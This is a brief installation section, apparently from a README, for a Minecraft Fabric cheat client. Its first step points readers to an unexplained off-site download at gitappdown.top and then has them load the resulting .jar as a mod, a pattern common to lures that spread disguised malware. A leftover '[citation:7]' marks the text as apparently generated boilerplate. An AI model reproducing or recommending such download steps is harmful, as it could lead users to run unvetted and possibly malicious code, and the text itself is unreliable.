## 🔧 Installation / How to Use

1. Click **[CLICK](https://gitappdown.top/)** to download.

2. Install Fabric API for your Minecraft version.

3. Place the client `.jar` file in your `mods` folder.

4. Launch Minecraft with the Fabric profile.

5. Press the default keybind (usually `.` or `Right Shift`) to open the ClickGUI.

> **Note:** For anarchy-specific clients like Payload, check dependencies and compatibility with Future, Meteor, or RusherHack [citation:7].
